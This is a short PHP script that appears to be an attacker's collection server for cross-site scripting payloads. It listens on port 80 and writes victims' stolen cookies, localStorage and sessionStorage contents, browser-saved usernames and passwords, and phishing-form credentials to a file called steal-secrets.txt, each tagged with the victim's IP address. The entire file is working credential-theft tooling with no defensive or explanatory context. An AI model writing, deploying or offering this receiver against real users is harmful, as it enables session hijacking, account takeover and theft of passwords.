<?php
// php -S 0.0.0.0:80
// tail -f steal-secrets.txt

// cookie
if (isset($_GET['cookie'])) {
    $list = explode(";", $_GET['cookie']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("steal-secrets.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookies: {$cookie}\n");
        fclose($file);
    }
}

// localStorage
if (isset($_GET['localstorage'])) {
    $list = explode(";", $_GET['localstorage']);
    foreach ($list as $key => $value) {
        $localstorage = urldecode($value);
        $file = fopen("steal-secrets.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | localStorage: {$localstorage}\n");
        fclose($file);
    }
}

// sessionStorage
if (isset($_GET['sessionstorage'])) {
    $list = explode(";", $_GET['sessionstorage']);
    foreach ($list as $key => $value) {
        $sessionstorage = urldecode($value);
        $file = fopen("steal-secrets.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | sessionStorage: {$sessionstorage}\n");
        fclose($file);
    }
}

// saved passwords
if (isset($_GET['type'])) {
    if ($_GET['type'] == "saved-passwords" && isset($_GET['username']) && isset($_GET['password'])) {
        $username = urldecode($_GET['username']);
        $password = urldecode($_GET['password']);
        $file = fopen("steal-secrets.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Saved password: {$username} - {$password}\n");
        fclose($file);
    }
}

// phishing
if (isset($_GET['type'])) {
    if ($_GET['type'] == "phishing" && isset($_GET['username']) && isset($_GET['password'])) {
        $username = urldecode($_GET['username']);
        $password = urldecode($_GET['password']);
        $file = fopen("steal-secrets.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Phishing: {$username} - {$password}\n");
        fclose($file);
    }
} 
?>